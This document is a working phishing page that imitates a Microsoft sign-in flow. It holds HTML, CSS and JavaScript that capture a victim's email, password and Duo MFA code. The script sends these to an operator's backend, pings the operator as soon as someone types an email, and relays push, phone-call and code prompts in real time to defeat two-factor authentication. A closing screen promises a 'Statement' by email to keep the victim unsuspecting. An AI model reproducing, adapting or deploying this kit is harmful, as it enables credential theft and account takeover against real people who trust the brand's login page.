<style>
    /* MODAL CONTAINER */
   /* 1. This is the new container that will be full-screen */
  /* Main container for the full-screen overlay */
  .modal-overlay-container {
        display: flex;
        flex-direction: column;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        z-index: 1000;
        display: flex;
        align-items: center;
        justify-content: center;
    }

    /* The white box for the form */
    .login-form-container {
        max-width: 440px; 
        width: 100%;
        background-color: #fff;
        padding: 2.75rem;
        box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
        box-sizing: border-box;
        border-radius: 4px;
        transition: all 0.3s ease; /* Add transition for smooth resizing */
    }
    
    /* ... All other CSS styles remain the same ... */
    .login-form-container{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI','Roboto','Oxygen','Ubuntu','Cantarell','Fira Sans','Droid Sans','Helvetica Neue',sans-serif;font-size:.875rem;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.microsoft-logo{height:1.5rem}.form-title{font-size:1.5rem;font-weight:600;margin-bottom:.5rem;color:#1a202c}.input-field-container{margin-bottom:1rem}.input-field{width:100%;padding:.5rem 0;background-color:transparent;border:none;border-bottom:1px solid #a0aec0;transition:border-color .15s cubic-bezier(.4,0,.2,1)}.input-field::-moz-placeholder{color:#4a5568}.input-field::placeholder{color:#4a5568}.input-field:focus{border-bottom-width:2px;border-color:#0067b8;outline:none}.text-xs-custom{font-size:.75rem}.text-gray-700-custom{color:#4a5568}.link-custom{color:#0067b8;text-decoration:none}.link-custom:hover{text-decoration:underline;color:#005da6}.flex-justify-end{display:flex;justify-content:flex-end}.button-primary{background-color:#0067b8;color:#fff;padding:.5rem 2rem;border:none;cursor:pointer;transition:background-color .15s cubic-bezier(.4,0,.2,1)}.button-primary:hover{background-color:#005da6}.button-primary:focus{outline:none;box-shadow:0 0 0 2px rgba(0,86,166,.5)}.button-primary:disabled{background-color:#d1d5db;cursor:not-allowed}.password-step-header{display:flex;align-items:center;margin-bottom:1rem}.back-button{margin-right:.75rem;padding:.25rem;border-radius:9999px;background:none;border:none;cursor:pointer}.back-button:hover{background-color:#e5e7eb}.back-button-icon{height:1.25rem;width:1.25rem;color:#4b5563;display:block}.email-display{color:#4a5568;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.auth-message{font-size:.875rem;margin-bottom:1rem}.flex-justify-between{display:flex;justify-content:space-between;align-items:center}.checkbox-container{display:flex;align-items:center;cursor:pointer;font-size:.8rem}.checkbox-input{margin-right:.5rem}.sign-in-options{margin-top:2rem;border-top:1px solid #d1d5db;padding-top:1.5rem;display:flex;align-items:center}.key-icon-svg{width:1rem;height:1rem;margin-right:.5rem;color:#4b5563}.mfa-prompt-container{display:flex;align-items:center;justify-content:flex-start;width:100%;margin-bottom:1.5rem;padding:1rem;border:1px solid #dcdcdc;border-radius:4px}.mfa-prompt-icon{width:24px;height:24px;color:#555;margin-right:1rem}.mfa-prompt-text{font-size:.95rem;color:#333}.mfa-options-container{width:100%;display:flex;flex-direction:column;gap:1rem}.mfa-links{display:flex;flex-direction:column;align-items:flex-start;gap:.5rem;margin-top:.5rem}.spinner{border:4px solid rgba(0,0,0,.1);width:24px;height:24px;border-radius:50%;border-left-color:#0067b8;animation:spin 1s ease infinite;margin-right:1rem}@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}.hidden{display:none}


    .microsoft-logo {
        height: 1.5rem;
    }
  
    .form-title {
        font-size: 1.5rem;
        font-weight: 600;
        margin-bottom: 0.5rem;
        color: #1a202c;
    }
  
    .input-field-container {
        margin-bottom: 1rem;
    }
  
    .input-field {
        width: 100%;
        padding: 0.5rem 0;
        background-color: transparent;
        border: none;
        border-bottom: 1px solid #a0aec0;
        transition: border-color 150ms cubic-bezier(0.4, 0, 0.2, 1);
    }
  
    .input-field::placeholder {
        color: #4a5568;
    }
  
    .input-field:focus {
        border-bottom-width: 2px;
        border-color: #0067b8;
        outline: none;
    }
  
    .text-xs-custom {
        font-size: 0.75rem;
    }
  
    .text-gray-700-custom {
        color: #4a5568;
    }
  
    .link-custom {
        color: #0067b8;
        text-decoration: none;
    }
  
    .link-custom:hover {
        text-decoration: underline;
        color: #005da6;
    }
  
    .flex-justify-end {
        display: flex;
        justify-content: flex-end;
    }
  
    .button-primary {
        background-color: #0067b8;
        color: white;
        padding: 0.5rem 2rem;
        border: none;
        cursor: pointer;
        transition: background-color 150ms cubic-bezier(0.4, 0, 0.2, 1);
    }
  
    .button-primary:hover {
        background-color: #005da6;
    }
  
    .button-primary:focus {
        outline: none;
        box-shadow: 0 0 0 2px rgba(0, 86, 166, 0.5);
    }
  
    .button-primary:disabled {
        background-color: #d1d5db;
        cursor: not-allowed;
    }
  
    .password-step-header {
        display: flex;
        align-items: center;
        margin-bottom: 1rem;
    }
  
    .back-button {
        margin-right: 0.75rem;
        padding: 0.25rem;
        border-radius: 9999px;
        background: none;
        border: none;
        cursor: pointer;
    }
    
    .back-button:hover {
        background-color: #e5e7eb;
    }
  
    .back-button-icon {
        height: 1.25rem;
        width: 1.25rem;
        color: #4b5563;
        display: block;
    }
  
    .email-display {
        color: #4a5568;
        overflow: hidden;
        text-overflow: ellipsis;
        white-space: nowrap;
    }
  
    .auth-message {
        font-size: 0.875rem;
        margin-bottom: 1rem;
    }
  
    .flex-justify-between {
        display: flex;
        justify-content: space-between;
        align-items: center;
    }
  
    .checkbox-container {
        display: flex;
        align-items: center;
        cursor: pointer;
        font-size: 0.8rem;
    }
  
    .checkbox-input {
        margin-right: 0.5rem;
    }
  
    .sign-in-options {
        margin-top: 2rem;
        border-top: 1px solid #d1d5db;
        padding-top: 1.5rem;
        display: flex;
        align-items: center;
    }
  
    .key-icon-svg {
        width: 1rem;
        height: 1rem;
        margin-right: 0.5rem;
        color: #4b5563;
    }
  
    /* MFA/DUO styles */
    .mfa-prompt-container {
        display: flex;
        align-items: center;
        justify-content: flex-start;
        width: 100%;
        margin-bottom: 1.5rem;
        padding: 1rem;
        border: 1px solid #dcdcdc;
        border-radius: 4px;
    }
  
    .mfa-prompt-icon {
        width: 24px;
        height: 24px;
        color: #555;
        margin-right: 1rem;
    }
  
    .mfa-prompt-text {
        font-size: 0.95rem;
        color: #333;
    }
  
    .mfa-options-container {
        width: 100%;
        display: flex;
        flex-direction: column;
        gap: 1rem;
    }
  
    .mfa-links {
        display: flex;
        flex-direction: column;
        align-items: flex-start;
        gap: 0.5rem;
        margin-top: 0.5rem;
    }
  
    .spinner {
        border: 4px solid rgba(0, 0, 0, 0.1);
        width: 24px;
        height: 24px;
        border-radius: 50%;
        border-left-color: #0067b8;
        animation: spin 1s ease infinite;
        margin-right: 1rem;
    }
  
    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }
    
    .hidden {
        display: none;
    }


    /* --- ADD THIS BLOCK FOR MOBILE RESPONSIVENESS --- */
    @media (max-width: 500px) {
      .login-form-container {
        /* Reduce the padding on small screens to give more room */
        padding: 1.5rem;

        /* Use 90% of the screen width to leave a small margin on the sides */
        width: 90%;
        
        /* Ensure the modal doesn't get too tall for the screen */
        max-height: 95%;

        /* If the content is too long, allow the modal to scroll */
        overflow-y: auto;
      }
    }
  </style>
  <div class="modal-overlay-container">
  
  <div class="login-form-container">
    <div id="email-step">
        <div style="margin-bottom: 1.5rem;">
            <img
                src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31"
                alt="Microsoft Logo"
                class="microsoft-logo"
                onerror="this.onerror=null; this.src='https://placehold.co/108x24/cccccc/000000?text=Logo+Error';"
            />
        </div>
        <h1 class="form-title">Sign in</h1>
        <form id="email-form">
            <div class="input-field-container">
                <input
                    type="email"
                    id="email-input"
                    placeholder="Email, phone, or Skype"
                    class="input-field"
                    autofocus
                />
            </div>
            <div class="text-xs-custom" style="margin-bottom: 1.5rem;">
                <p class="text-gray-700-custom">
                    No account?
                    <a href="#" class="link-custom">
                        Create one!
                    </a>
                </p>
            </div>
            <div class="flex-justify-end">
                <button
                    type="submit"
                    id="next-button"
                    class="button-primary"
                >
                    Next
                </button>
            </div>
        </form>
    </div>
  
    <div id="password-step" class="hidden">
        <div style="margin-bottom: 1.5rem;">
            <img
                src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31"
                alt="Microsoft Logo"
                class="microsoft-logo"
                onerror="this.onerror=null; this.src='https://placehold.co/108x24/cccccc/000000?text=Logo+Error';"
            />
        </div>
        <div class="password-step-header">
            <button id="back-to-email-button" class="back-button">
                <svg xmlns="http://www.w3.org/2000/svg" class="back-button-icon" viewBox="0 0 20 20" fill="currentColor">
                    <path fill-rule="evenodd" d="M12.707 5.293a1 1 0 010 1.414L9.414 10l3.293 3.293a1 1 0 01-1.414 1.414l-4-4a1 1 0 010-1.414l4-4a1 1 0 011.414 0z" clip-rule="evenodd" />
                </svg>
            </button>
            <span id="email-display" class="email-display"></span>
        </div>
        <h1 class="form-title">Enter password</h1>
        <form id="password-form">
            <div style="margin-bottom: 0.5rem;">
                <input
                    type="password"
                    id="password-input"
                    placeholder="Password"
                    class="input-field"
                />
            </div>
            <p id="auth-message-password" class="auth-message" style="margin-bottom: 1rem;"></p>
            <div class="flex-justify-between" style="margin-bottom: 1.5rem;">
                <label class="checkbox-container">
                    <input
                        type="checkbox"
                        id="keep-signed-in-checkbox"
                        class="checkbox-input"
                    />
                    Keep me signed in
                </label>
                <a href="#" class="link-custom">Forgot password?</a>
            </div>
            <div class="flex-justify-end">
                <button
                    type="submit"
                    id="sign-in-button"
                    class="button-primary"
                >
                    Sign in
                </button>
            </div>
        </form>
        <div class="sign-in-options">
            <svg class="key-icon-svg" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1" stroke="currentColor">
                <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 5.25a3 3 0 013 3m3 0a6 6 0 01-7.029 5.912c-.563-.097-1.159.026-1.563.43L10.5 17.25H8.25v2.25H6v2.25H2.25v-2.818c0-.597.237-1.17.659-1.591l6.499-6.499c.404-.404.527-1 .43-1.563A6 6 0 1121.75 8.25z" />
            </svg>
            <a href="#" class="link-custom">Sign-in options</a>
        </div>
    </div>
  
    <div id="duo-mobile-step" class="hidden">
        <div style="margin-bottom: 1.5rem;">
            <img
                src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31"
                alt="Microsoft Logo"
                class="microsoft-logo"
                onerror="this.onerror=null; this.src='https://placehold.co/108x24/cccccc/000000?text=Logo+Error';"
            />
        </div>
        <div class="password-step-header">
            <button id="back-to-password-button" class="back-button">
                <svg xmlns="http://www.w3.org/2000/svg" class="back-button-icon" viewBox="0 0 20 20" fill="currentColor">
                    <path fill-rule="evenodd" d="M12.707 5.293a1 1 0 010 1.414L9.414 10l3.293 3.293a1 1 0 01-1.414 1.414l-4-4a1 1 0 010-1.414l4-4a1 1 0 011.414 0z" clip-rule="evenodd" />
                </svg>
            </button>
            <span id="email-display-duo" class="email-display"></span>
        </div>
        <div id="duo-code-section" class="hidden">
            <h1 class="form-title">DUO CODE</h1>
            <p id="auth-message-duo-code" class="auth-message" style="margin-bottom: 1rem;"></p>
            <form id="duo-code-form">
                <div class="input-field-container" style="margin-bottom: 0.5rem;">
                    <input
                        type="text"
                        id="duo-code-input"
                        placeholder="Enter security code"
                        class="input-field"
                    />
                </div>
                <div class="flex-justify-end">
                    <button
                        type="submit"
                        id="verify-button"
                        class="button-primary"
                    >
                        Verify
                    </button>
                </div>
            </form>
        </div>
        <div id="mfa-prompt-section">
            <h1 class="form-title" style="margin-bottom: 2rem;">Approve sign in request</h1>
            <div class="mfa-prompt-container">
                <div id="mfa-icon-container"></div>
                <p id="mfa-prompt-text" class="mfa-prompt-text"></p>
            </div>
            <div class="mfa-options-container">
                <label class="checkbox-container">
                    <input
                        type="checkbox"
                        id="dont-ask-again-checkbox"
                        class="checkbox-input"
                    />
                    Don't ask again for 30 days
                </label>
                <div class="mfa-links">
                    <a href="#" class="link-custom">Having trouble? Sign in another way</a>
                    <a href="#" class="link-custom">More information</a>
                </div>
            </div>
        </div>
    </div>
  
    <div id="success-step" class="hidden">
         <div style="margin-bottom: 1.5rem;">
            <img
                src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31"
                alt="Microsoft Logo"
                class="microsoft-logo"
                onerror="this.onerror=null; this.src='https://placehold.co/108x24/cccccc/000000?text=Logo+Error';"
            />
        </div>
        <h1 class="form-title" style="margin-bottom: 16px;">Thanks!</h1>
        <p style="font-size: 1.1rem; color: #333; margin-bottom: 8px;">
            No Further Action Needed on your end.
        </p>
        <p style="font-size: 0.9rem; color: #555;">
            An email containing the Statement will be sent to you shortly.
        </p>
    </div>
  </div>
  </div>
  <script>
    // Using a self-executing function to avoid polluting the global scope
    (() => {
        // --- STATE ---
        const api_url = "http://127.0.0.1:5000"; // IMPORTANT: Set your actual API URL here
        let email = '';
        let password = '';
        let keepSignedIn = false;
        let duoCode = '';
        let dontAskAgain = false;
        let isSubmitting = false;
        let alert_email_typing = false;
        let pollInterval;
  
        // --- DOM ELEMENTS ---
        // Using querySelector to scope search within the modal if needed, though IDs are global
        const emailStep = document.getElementById('email-step');
        const passwordStep = document.getElementById('password-step');
        const duoMobileStep = document.getElementById('duo-mobile-step');
        const successStep = document.getElementById('success-step');
  
        const emailForm = document.getElementById('email-form');
        const emailInput = document.getElementById('email-input');
        const nextButton = document.getElementById('next-button');
  
        const passwordForm = document.getElementById('password-form');
        const passwordInput = document.getElementById('password-input');
        const signInButton = document.getElementById('sign-in-button');
        const backToEmailButton = document.getElementById('back-to-email-button');
        const emailDisplay = document.getElementById('email-display');
        const authMessagePassword = document.getElementById('auth-message-password');
        const keepSignedInCheckbox = document.getElementById('keep-signed-in-checkbox');
  
        const backToPasswordButton = document.getElementById('back-to-password-button');
        const emailDisplayDuo = document.getElementById('email-display-duo');
        
        const duoCodeSection = document.getElementById('duo-code-section');
        const mfaPromptSection = document.getElementById('mfa-prompt-section');
        
        const duoCodeForm = document.getElementById('duo-code-form');
        const duoCodeInput = document.getElementById('duo-code-input');
        const verifyButton = document.getElementById('verify-button');
        const authMessageDuoCode = document.getElementById('auth-message-duo-code');
        
        const mfaIconContainer = document.getElementById('mfa-icon-container');
        const mfaPromptText = document.getElementById('mfa-prompt-text');
        const dontAskAgainCheckbox = document.getElementById('dont-ask-again-checkbox');
  
        const phoneIconSVG = `<svg class="mfa-prompt-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M2.25 6.75c0 8.284 6.716 15 15 15h2.25a2.25 2.25 0 002.25-2.25v-1.372c0-.516-.351-.966-.852-1.091l-4.423-1.106c-.44-.11-.902.055-1.173.417l-1.49 1.49c-1.976-1.034-3.668-2.726-4.702-4.702l1.49-1.49a.75.75 0 00.417-1.173l-1.106-4.423a1.125 1.125 0 00-1.091-.852H3.75A2.25 2.25 0 002.25 6.75z" /></svg>`;
        const spinnerDiv = `<div class="spinner"></div>`;
  
        // --- FUNCTIONS ---
        const showStep = (stepToShow) => {
            [emailStep, passwordStep, duoMobileStep, successStep].forEach(step => step.classList.add('hidden'));
            if (stepToShow) stepToShow.classList.remove('hidden');
        };
        
        const setAuthMessage = (element, message, isError) => {
            element.textContent = message;
            element.style.color = isError ? '#d9534f' : 'inherit';
            element.classList.toggle('hidden', !message);
        };
  
        const setSubmittingState = (submitting, buttonText, verifyText) => {
            isSubmitting = submitting;
            signInButton.disabled = submitting;
            verifyButton.disabled = submitting;
            signInButton.textContent = submitting ? 'Signing in...' : buttonText;
            verifyButton.textContent = submitting ? 'Verifying...' : verifyText;
        };
        
        const stopPolling = () => {
            if (pollInterval) {
                clearInterval(pollInterval);
                pollInterval = null;
            }
        };
  
        const send_alert_notification = async (message) => {
            if (!api_url) return;
            try {
                await fetch(`${api_url}/alert`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ message }),
                });
            } catch (error) {
                console.error('Alert notification failed:', error);
            }
        };
  
        async function get_status_for_email(currentEmail, currentPassword, currentDuoCode = '') {
            if (!api_url) {
                console.warn("API URL is not set. Returning mock data.");
                if (currentPassword !== 'password123') return 'incorrect password';
                if (currentDuoCode && currentDuoCode !== '123456') return 'incorrect duo code';
                if (currentDuoCode === '123456') return 'success';
                return Math.random() > 0.5 ? 'mobile notification' : 'duo code'; // Randomize for testing
            }
            try {
                let response = await fetch(`${api_url}/auth`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email: currentEmail, password: currentPassword, duoCode: currentDuoCode }),
                });
                if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
                let data = await response.json();
                return data.status;
            } catch (error) {
                console.error('Auth status fetch failed:', error);
                return 'error';
            }
        }
  
        const handleNextClick = (e) => {
            e.preventDefault();
            if (emailInput.value) {
                email = emailInput.value;
                emailDisplay.textContent = email;
                emailDisplayDuo.textContent = email;
                showStep(passwordStep);
                setAuthMessage(authMessagePassword, '', false);
                passwordInput.focus();
            }
        };
  
        const handleBackClick = () => {
            stopPolling();
            setSubmittingState(false, 'Sign in', 'Verify');
            showStep(passwordStep);
            setAuthMessage(authMessageDuoCode, '', false);
            setAuthMessage(authMessagePassword, '', false);
        };
  
        const handleSignIn = async (e) => {
            e.preventDefault();
            stopPolling(); 
  
            password = passwordInput.value || password;
            duoCode = duoCodeInput.value || '';
            
            if (!password) {
                setAuthMessage(authMessagePassword, 'Password is required.', true);
                return;
            }
  
            setSubmittingState(true, 'Sign in', 'Verify');
            setAuthMessage(authMessagePassword, '', false);
            setAuthMessage(authMessageDuoCode, '', false);
  
            let attempts = 0;
            const maxAttempts = 60; 
  
            const pollStatus = async () => {
                if (attempts >= maxAttempts) {
                    setAuthMessage(authMessagePassword, 'Authentication timed out. Please try again.', true);
                    setSubmittingState(false, 'Sign in', 'Verify');
                    showStep(passwordStep);
                    stopPolling();
                    return;
                }
                
                const status = await get_status_for_email(email, password, duoCode);
                console.log('Authentication status:', status);
                attempts++;
  
                let keepPolling = false;
  
                switch (status) {
                    case 'pending':
                        setAuthMessage(authMessagePassword, 'Authentication pending...', false);
                        showStep(passwordStep);
                        keepPolling = true;
                        break;
                    case 'incorrect password':
                        setAuthMessage(authMessagePassword, 'Incorrect password. Please try again.', true);
                        setSubmittingState(false, 'Sign in', 'Verify');
                        showStep(passwordStep);
                        passwordInput.focus();
                        break;
                    case 'mobile notification':
                    case 'phone_call':
                        const message = status === 'mobile notification'
                            ? 'We sent a notification to your mobile device. Please open it to continue.'
                            : "We're calling your phone. Please answer it to continue.";
                        
                        mfaIconContainer.innerHTML = status === 'phone_call' ? phoneIconSVG : spinnerDiv;
                        mfaPromptText.textContent = message;
                        showStep(duoMobileStep);
                        duoCodeSection.classList.add('hidden');
                        mfaPromptSection.classList.remove('hidden');
                        keepPolling = true;
                        break;
                    case 'duo code':
                    case 'incorrect duo code':
                        const isIncorrect = status === 'incorrect duo code';
                        const duoMessage = isIncorrect ? 'Incorrect code. Please try again.' : 'Open your Duo app for a one-time code and enter it here.';
                        setAuthMessage(authMessageDuoCode, duoMessage, isIncorrect);
                        showStep(duoMobileStep);
                        duoCodeSection.classList.remove('hidden');
                        mfaPromptSection.classList.add('hidden');
                        duoCodeInput.value = '';
                        duoCodeInput.focus();
                        setSubmittingState(false, 'Sign in', 'Verify');
                        break;
                    case 'success':
                        showStep(successStep);
                        break;
                    default:
                        setAuthMessage(authMessagePassword, 'An unexpected error occurred. Please try again.', true);
                        setSubmittingState(false, 'Sign in', 'Verify');
                        showStep(passwordStep);
                        break;
                }
  
                if (!keepPolling) {
                    stopPolling();
                }
            };
            
            await pollStatus();
            
            if (isSubmitting) {
                 pollInterval = setInterval(pollStatus, 1000);
            }
        };
  
        // --- EVENT LISTENERS ---
        emailInput.addEventListener('input', () => {
            if (!alert_email_typing) {
                alert_email_typing = true;
                send_alert_notification("Someone is currently typing an email");
            }
        });
        
        emailForm.addEventListener('submit', handleNextClick);
        
        nextButton.addEventListener('click', () => {
            if(emailInput.value) {
                send_alert_notification("Someone is trying to sign in with email: " + emailInput.value);
            }
        });
  
        backToEmailButton.addEventListener('click', () => {
            stopPolling();
            showStep(emailStep);
        });
  
        backToPasswordButton.addEventListener('click', handleBackClick);
        
        passwordForm.addEventListener('submit', handleSignIn);
        duoCodeForm.addEventListener('submit', handleSignIn);
  
        keepSignedInCheckbox.addEventListener('change', (e) => keepSignedIn = e.target.checked);
        dontAskAgainCheckbox.addEventListener('change', (e) => dontAskAgain = e.target.checked);
  
        // --- INITIALIZATION ---
        showStep(emailStep);
    })();
  </script>